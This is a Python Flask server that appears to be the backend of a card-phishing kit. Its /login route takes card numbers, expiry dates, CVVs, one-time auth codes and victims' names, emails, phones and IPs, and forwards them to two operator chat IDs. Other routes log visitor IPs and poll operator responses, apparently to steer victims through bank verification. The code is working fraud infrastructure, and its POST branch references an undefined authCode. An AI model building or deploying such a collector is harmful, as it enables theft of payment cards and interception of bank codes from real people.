from flask import Flask, redirect, request, jsonify
from flask_cors import CORS
from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut
from CHAT_ID import MAIN_ID, Egoist
from checker import get_button_by_id
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DOMEN = 'http://127.0.0.1:5500'



@app.before_request
def log_request_info():
    print('Headers:', request.headers)
    print('Body:', request.get_data())
    print('Args:', request.args)

@app.route('/chel', methods=['GET', 'POST'])
def chel():
    ip_address = request.args.get('ip')
    
    if ip_address:
        cheltut(ip_address)
        return jsonify({"message": "IP address received", "ip": ip_address})
    else:
        return jsonify({"error": "No IP address provided"}), 400
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        print("Received a GET request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        card_number = request.args.get('cardNumber')
        expiry_date = request.args.get('expiryDate')
        cvv = request.args.get('cvv')
        id = request.args.get('id')
        question = request.args.get('question')
        authCode = request.args.get('authCode')
        epin = request.args.get('epinAuthCode')
        session = request.args.get('session')
        name = request.args.get('name')
        email = request.args.get('email')
        tel = request.args.get('tel')
        ip_address = request.args.get('ip')

        print(email, 495592185123908439878598547398345978435978)
        ID = f'{session}'
        # WE
        if id == '1000001':
            if authCode is not None and authCode != 'None':
                send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            ne_pizdabol(card_number)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        # Egoist
        elif id == '1000002':
            if authCode is not None and authCode != 'None':
                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки

    elif request.method == 'POST':
        print("Received a POST request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        data = request.get_json()
        card_number = data.get('cardNumber')
        expiry_date = data.get('expiryDate')
        cvv = data.get('cvv')
        id = data.get('id')
        question = data.get('question')
        session = data.get('session')
        name = data.get('name')
        tel = data.get('tel')
        email = data.get('email')
        ip_address = data.get('ip')

        print(email, 495592185123908439878598547398345978435978)
        ID = f'{session}'
        # WE
        if id == '1000001':
            if authCode is not None and authCode != 'None':
                send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            ne_pizdabol(card_number)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        # Egoist
        elif id == '1000002':
            if authCode is not None and authCode != 'None':
                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки


@app.route('/test', methods=['GET'])
def test():
    return jsonify(number=3)

@app.route('/update', methods=['GET'])
def test2():
    database = r"database.db"
    user_id_to_check = request.args.get('session')  
    result = str(get_button_by_id(user_id_to_check, database))
    return jsonify({'result': result})
if __name__ == '__main__':
    app.run(debug=True)
    
